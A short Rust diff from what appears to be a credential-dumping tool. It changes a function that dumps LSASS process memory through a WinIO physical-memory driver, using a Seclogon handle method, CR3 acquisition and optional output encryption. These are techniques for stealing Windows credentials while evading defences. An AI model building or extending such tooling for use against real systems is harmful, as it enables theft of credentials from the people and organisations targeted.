@@ -76,6 +76,8 @@ struct Cli {
     #[arg(short, long, value_enum, default_value_t = HandleMethod::Seclogon)]
     method: HandleMethod,
 
+
+
     /// Encrypt output
     #[arg(long, default_value_t = false)]
     encrypt: bool,
@@ -432,14 +434,17 @@ fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Res
         .map_err(|e| format!("CR3 acquisition failed: {}", e))?;
 
     println!("[*] Step 4: Building output via physical memory...");
-    let dump_result = minidump::create_minidump_phys(
-        api,
+    let dump_result = minidump::create_minidump_full_phys(
+        &engine,
         lsass_handle,
+        lsass_pid,
         cr3,
         &|pa, buf| engine.read_phys(pa, buf),
         &cli.output,
         cli.encrypt,
     );
+
+
 
     unsafe {
         let fn_close: unsafe extern "system" fn(
